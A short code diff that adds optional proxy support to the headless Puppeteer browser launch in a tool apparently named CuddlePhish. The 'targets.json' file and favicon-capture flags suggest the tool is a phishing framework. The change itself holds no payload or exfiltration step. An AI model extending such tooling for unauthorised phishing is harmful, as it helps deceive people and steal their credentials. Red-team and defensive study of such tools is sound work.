@@ -14,6 +14,7 @@ if (fs.existsSync('./targets.json')){
   config = JSON.parse(fs.readFileSync('./targets.json'))
 }
 
+var cuddlephish_config = JSON.parse(fs.readFileSync('./config.json'))
 var captured_favicon = false;
 var desperate = false;
 var super_desperate = false;
@@ -26,6 +27,11 @@ var favicon_url = '';
     "--start-maximized",
     "--no-sandbox",
   ]
+
+  if(cuddlephish_config.proxy !== undefined){
+    puppet_options.push("--proxy-server=" + cuddlephish_config.proxy)
+  }
+
   const browser = await puppeteer.launch({
     headless: "new",
     ignoreHTTPSErrors: true,
